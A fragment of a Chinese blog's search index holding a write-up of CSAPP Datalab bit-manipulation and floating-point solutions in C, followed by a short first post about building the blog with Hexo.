negate题意：求一个数的相反数。思路：水题，由常用结论我们知道，-x = ~x + 1解：123int negate(int x) &#123; return ~x+1;&#125; isAsciiDight题意：判断一个数字是否在(0x30和0x39)之间思路：这道题我想不出比较好的解法。只能暴力判断。即先看2进制下的前26六位是否有值，然后在看下后6位。x+6仍然小于0x40，则x小于0x3。.再看下剩下六位中前两位是否均为1，是的话x大于0x30。解：12345int isAsciiDigit(int x) &#123; int t = x &amp; 0xFFFFFFC0; x = x &amp; 0x3F; return !t&amp;!((x+6)&amp;0x40)&amp;(x&gt;&gt;4)&amp;(x&gt;&gt;5)&amp;1;&#125; conditional题意：实现三目运算符 ？：思路：先用！判断是否为x是否为真。然后在利用与的性质：一个数和0xffffffff相与结果为其本身，和0相与结果为0。解：1234int conditional(int x, int y, int z) &#123; x = !x; return y&amp;(~(!x)+1) | z&amp;(~x+1);&#125; isLessOrEqual题意：判断x是否小于等于y思路：x&lt;=y 则 y - x &gt;= 0。分别取出x和y的符号，进行判断。若y大于0，x小于0，则显然为真。若y小于0，x大于0，则显然为假。剩下的异号的情况则用y + (-x) 判断即可。解：12345int isLessOrEqual(int x, int y) &#123; int sgnx = (x&gt;&gt;31)&amp;1; int sgny = (y&gt;&gt;31)&amp;1; return !sgny &amp; sgnx | !(sgnx^sgny) &amp; !((y + (~x+1))&amp;(1&lt;&lt;31));&#125; logicalNeg题意：使用其他的逻辑运算符和位运算符实现 ！运算符思路：我们知道，一个数的相反数等于其本身的数只有0(注意：~0x80000000 + 1 = 0x80000000)解：123int logicalNeg(int x) &#123; return ((~x+1 | x)&gt;&gt;31)+1;&#125; howManyBits题意：给一个数字x,求出要表示出x需要的最少的位数。思路：个人觉得，本题难度很大。以下的思路可能并不算很好，不过还是可以通过的。 首先，我们知道，对于一个n位的二进制数，能表示的数字的范围为 -2n ~ 2n - 1。故对于输入的整数x，我们可以先将其变成正数，即下方的_mask。现在就只需考虑正数。题目转化为求最高位的1。但最高位的1不是很好求，我们可以将其转化为求二进制下x含有多少个1。 假设当前最高位的1位于第5位，右移并按位或后，第五位，第四位均为1，再向右移两位并且按位或，第二、三、四、五位均为1，以此类推，我们将最高位的1后的所有位全部变成了1。(假设原数为0x0A0BA973，经过处理之后就会变成0x0FFFFFFF)。 接下来考虑如何求出所有位上1的总数。我们可以考虑使用分段的办法。考虑以下的32位二进制数,我们将其分成四个部分： 00000010 | 00100111 | 11010010 | 00110001接下来我们采用掩码分别将其各个部分的1的总数做一个累加，掩码应为： 00000001 | 00000001 | 00000001 | 00000001即对每一个部分，掩码的值都是1。接下来用&amp;运算符获得最低位的数字，四个部分分别为0,1,0,1. 然后，再将x右移一位，再继续进行&amp;运算，以此类推，最后得到四个部分的值分别为：1,4,4,3。即最后得到的sum为： 00000001 | 00000100 | 00000100 | 00000011最后再利用掩码0xff(11111111)，分别得到各个部分的值，做一个累加，得到答案(别忘记+1)。解：12345678910111213141516171819int howManyBits(int x) &#123; int _mask = (x&amp;(1&lt;&lt;31))&gt;&gt;31; x = x^_mask; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; int sum = 0, mask = 0x1 | 0x100 | 0x10000 | 0x1000000; sum += x &amp; mask; sum += (x&gt;&gt;1) &amp;mask; sum += (x&gt;&gt;2) &amp;mask; sum += (x&gt;&gt;3) &amp;mask; sum += (x&gt;&gt;4) &amp;mask; sum += (x&gt;&gt;5) &amp;mask; sum += (x&gt;&gt;6) &amp;mask; sum += (x&gt;&gt;7) &amp;mask; return (sum&amp;0xff) + ((sum&gt;&gt;8)&amp;0xff) + ((sum&gt;&gt;16)&amp;0xff) + ((sum&gt;&gt;24)&amp;0xff) + 1;&#125; floatScale2题意：本题给一个无符号数，让你把它看成一个浮点数(都是32位)，让你输出x * 2 的值思路：比较简单，按照浮点数1,8,23的分布将符号，指数，尾数分别取出，并分类讨论即可。解：123456789101112131415unsigned floatScale2(unsigned uf) &#123; unsigned frac = uf&amp;0x007fffff; uf&gt;&gt;=23; unsigned exp = uf&amp;0xff; uf&gt;&gt;=8; if (!exp) &#123; frac &lt;&lt;= 1; int t = frac&gt;&gt;23; if (t) &#123; frac = frac &amp; 0x007fffff; exp++; &#125; &#125; else if (exp != 0xff) exp++; return (uf&lt;&lt;31) + (exp&lt;&lt;23) + frac;&#125; floatFloat2Int题意：给你一个无符号数，并将其看成浮点数(32位)，要求输出(int)x的值思路：本题依然在考察对浮点数的基本理解。解决的思路同上题类似，不再赘述。另外提醒一下，本题有个坑，求得到的bias直接拿来进行右移运算或左移运算会存在问题：&gt;&gt; 和 &lt;&lt; 运算符当偏移量超过32时，会自动进行取模运算，故有可能使得结果出现错误。左移的话有可能还会导致答案溢出。记得分类讨论。解：1234567891011121314151617181920212223242526int floatFloat2Int(unsigned uf) &#123; int frac = uf &amp; 0x007fffff; uf &gt;&gt;= 23; int exp = uf &amp; 0xff; uf &gt;&gt;= 8; int sgn = uf; if (exp == 0xff) return 0x80000000u; else if (!exp) return 0; else &#123; frac |= 0x800000; int bias = exp - 0x7f - 23; if (bias &lt; 0) &#123; bias = -bias; if (bias &gt;= 32) bias = 31; frac &gt;&gt;= bias; &#125; else if (bias &gt; 0) &#123; while(bias) &#123; frac&lt;&lt;=1; bias--; if (frac &lt; 0) return 0x80000000u; &#125; &#125; if (sgn) return -frac; else return frac; &#125;&#125; floatPower2题意：给一个整数x，要求输出2.0x的值。思路：同样，本题依然在考察对浮点数存储的基本理解。要注意的是，+INF的是指exp为0xff，frac为0的值。NaN指的是exp为0xff，frac不为0的值。0的浮点数表示依然为0。解：12345678910unsigned floatPower2(int x) &#123; int sgn = 0, exp = 0, frac = 0; if (x &lt; -126 - 23) return 0; else if (x &lt; -126) frac = 1 &lt;&lt; (149+x); else &#123; exp = x + 127; if (exp &gt; 0xff) return 0x7f800000; &#125; return (exp&lt;&lt;23) + frac;&#125; 结尾 倘若一切顺利，你最终将得到类似这样的一张图片： 那么恭喜你，你的第一个实验————Datalab通关啦！]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>binary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[First article]]></title>
    <url>%2F2018%2F12%2F14%2FFirst-article%2F</url>
    <content type="text"><![CDATA[First article 终于基本把博客弄完了 感觉现在充满了成就感O(∩_∩)O。从这星期一开始就想弄了，但是却一直拖着。前两天在学HTML的一些语法，觉得语法真的好多啊，而且有点复杂。然后周三周四就基本都是在看搭博客的一些相关的东西，花了好长时间，一直在踩坑（可能是我比较菜）。买域名，弄github pages什么的。一开始用jekyll的框架来搭建，遇到了无数的问题，最后好在基本解决了，但是又发现踏入了一个新的大坑：找不到好用的模板。然后最后看到了hexo，果断先找模板。在看到了nexT这个主题之后，果断选择入坑。 可能是由于之前jekyll踩的坑有点多，也有可能是hexo比较适合小白。。基本上这个搭建过程中没有出现什么比较大的问题，然后弄完就是各种优化什么的，也算比较顺利吧，到今天早上就基本算是结束了。整体上还是过得去的。（不过貌似手机版看起来的效果比较差？？） 然后在这里就还是来立一个flag吧。以后（至少应该是大学期间吧）这个博客应该是会一直做下去的，尽量每个月至少发一篇博客吧，不过比较忙的时候的话可能没什么办法。基本上大部分博客的内容应该是以硬核为主，不过目前水平不够，也没办法写出比较高质量的东西。内容上可能主要是当前阶段在学习的一些东西，算法，数据结构，或者是自己做的一些小项目，课设什么的也有可能会放进来。目的还是分享吧，如果有什么地方写的不太好，欢迎直接私戳（网页版的话右下角应该是有一个对话框的）。 好吧，憋不出来了。。就这样吧 哦对了，最后放上一张有爱的图片镇楼（p站上找的）。]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>others</tag>
      </tags>
  </entry>
</search>
